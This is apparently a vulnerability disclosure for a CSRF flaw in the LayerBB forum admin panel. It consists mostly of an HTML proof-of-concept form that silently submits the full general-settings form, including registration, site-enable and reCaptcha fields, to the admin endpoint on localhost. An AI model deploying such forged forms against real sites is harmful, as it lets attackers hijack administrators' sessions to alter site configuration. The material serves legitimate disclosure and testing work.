# System Settings CSRF
Allows for the system settings in the admin control panel to be changed through CSRF.

## PoC:
```html
<link rel="stylesheet" href="http://localhost/public/admin/bower_components/bootstrap/dist/css/bootstrap.min.css">

<form action="http://localhost/admin/general.php" enctype="multipart/form-data" method="POST"><section class="col-lg-12">
    <div class="box box-success">
    <div class="box-header">
    <div class="tab-content" style="padding: 25px;">
    <br>
       <label for="site_name">Board Name</label>
       <input type="text" class="form-control" name="site_name" id="site_name" value="LayerBB Demo">
       <label for="board_email">Board Email</label>
       <input type="text" class="form-control" name="board_email" id="board_email" value="demo@layerbb.com">
       <label for="number_subs">Number of shown subforums</label>
       <input type="text" class="form-control" name="number_subs" id="number_subs" value="3">
       <input type="checkbox" name="register_enable" value="1" id="reg_enable" checked=""> <label for="reg_enable">Enable Registeration</label><br>
       <input type="checkbox" name="post_merge" value="1" id="post_merge" checked=""> <label for="post_merge">Merge Posts (<a href="#" title="Merge consecutive posts by the same user." id="tooltip">?</a>)</label><br>
       <input type="checkbox" name="site_enable" value="1" id="site_enable" checked=""> <label for="site_enable">Forum Enabled (<a href="#" title="Allows you to enable or disable your forums." id="tooltip">?</a>)</label><br>
       <input type="checkbox" name="email_verify" value="1" id="email_verify"> <label for="email_verify">Email Verification (<a href="#" title="Allows you to enable or disable email verification." id="tooltip">?</a>)</label><br>
       <input type="checkbox" name="enable_signatures" value="1" id="enable_signatures" checked=""> <label for="enable_signatures">Allow user signatures (<a href="#" title="Allows you to disable user signatures." id="tooltip">?</a>)</label><br>
       <input type="checkbox" name="enable_pcomments" value="1" id="enable_pcomments" checked=""> <label for="enable_pcomments">Enable Profile Comments (<a href="#" title="Allows you to disable profile comments." id="tooltip">?</a>)</label><br>
       <br>
       <label for="default_language">Default Languge</label><br>
       <select name="default_language" id="Default_language" class="form-control">
       <option value="english" selected="">English</option>
       </select><br>
       <input type="checkbox" name="enable_rtl" value="1" id="enable_rtl"> <label for="enable_rtl">Enable RTL (<a href="#" title="Enable Right-to-left for languages that need RTL" id="tooltip">?</a>)</label><br><br>
       <label for="board_rules">Board Rules</label>
       <span id="helpBlock" class="help-block">HTML tags will be converted into ascii codes. Hyperlinks are not supported!</span>
       <textarea name="board_rules" class="form-control" style="min-height:250px;">- No spamming.</textarea>
       <br>
       <label for="offline_msg">Offline Message</label>
       <span id="helpBlock" class="help-block">HTML tags will be converted into ascii codes.</span>
       <textarea name="offline_msg" class="form-control" style="min-height:250px;"></textarea>
    <br>
      <label for="rcap_public">reCaptcha Public Key</label>
      <input type="text" name="rcap_public" id="rcap_public" class="form-control" value="0">
      <label for="rcap_private">reCaptcha Private Key</label>
      <input type="text" name="rcap_private" id="rcap_private" class="form-control" value="0">
      <input type="checkbox" name="enable_recaptcha" value="1"> Use reCaptcha<br>
    <br>
      <label for="content">Board Signature</label>
      <textarea id="editor" name="board_signature" class="form-control" style="min-height:250px;"></textarea>
      <div class="alert alert-info" role="alert"><b>Please Note:</b> HTML Tags do not work, line breaks and urls are automatically converted!</div>
    <br>
      <label for="custom_logo">Easy Logo Changer</label>
      <input type="file" name="custom_logo" id="custom_logo" class="form-control">

    </div><br>
  <center><input type="submit" name="update" class="btn btn-default" value="Save Settings"></center><br>
  </div>
  </div></section>
</form>
```
